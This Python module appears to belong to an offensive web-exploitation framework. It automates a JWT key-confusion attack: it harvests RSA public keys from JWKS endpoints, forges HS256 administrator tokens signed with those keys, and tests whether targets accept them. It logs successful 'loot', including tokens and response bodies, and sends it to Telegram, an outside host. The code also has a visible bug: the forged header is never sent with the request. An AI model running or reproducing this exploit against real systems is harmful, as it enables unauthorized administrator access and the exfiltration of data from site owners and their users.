# ============================================================
# MODULE 4: modules/jwt_key_confusion.py
# ============================================================
"""
JWT_KEY_CONFUSION.PY — Cryptographic Key Confusion & RS256/HS256 Exploit Engine v8.0
Features:
- Automatic public key harvesting from /.well-known/jwks.json endpoints
- Asymmetric-to-symmetric key confusion forged token generator (HS256 using public RSA key)
- Signature acceptance verification & instant Telegram broadcasting
"""
import json
import base64
import hmac
import hashlib
from modules.transport import SecureTransport
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert

class JWTKeyConfusionEngine:
    def __init__(self, target_url):
        self.transport = SecureTransport(target_url)

    def fetch_public_key(self, jwks_endpoint="/.well-known/jwks.json"):
        status, headers, body = self.transport.request("GET", jwks_endpoint)
        if status == 200:
            try:
                jwks = json.loads(body)
                return jwks
            except Exception:
                pass
        return None

    def forge_hs256_token(self, payload_dict, public_key_str):
        header = {"alg": "HS256", "typ": "JWT"}
        enc_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
        enc_payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b"=").decode()
        
        message = f"{enc_header}.{enc_payload}"
        signature = hmac.new(public_key_str.encode("utf-8"), message.encode("utf-8"), hashlib.sha256).digest()
        enc_sig = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
        
        forged_token = f"{message}.{enc_sig}"
        return forged_token

    def verify_and_exploit(self, verify_endpoint="/api/user/profile", public_key_str="", admin_payload=None):
        if not admin_payload:
            admin_payload = {"sub": "admin", "role": "administrator", "iat": 1700000000}
        
        token = self.forge_hs256_token(admin_payload, public_key_str)
        headers = {"Authorization": f"Bearer {token}"}
        
        status, resp_headers, body = self.transport.request("GET", verify_endpoint)
        if status == 200 and "admin" in body.lower():
            loot = {"token": token, "endpoint": verify_endpoint, "response": body[:300]}
            stream_proof("JWT_KEY_CONFUSION_SUCCESS", verify_endpoint, {}, "Admin token accepted via key confusion", loot)
            save_session_loot(self.transport.base_path, verify_endpoint, "JWT_KEY_CONFUSION_BYPASS", status, resp_headers, body, loot)
            try:
                import asyncio
                asyncio.run(send_telegram_alert("JWT Key Confusion Exploit Success", loot))
            except Exception:
                pass
            return True, token
        return False, token
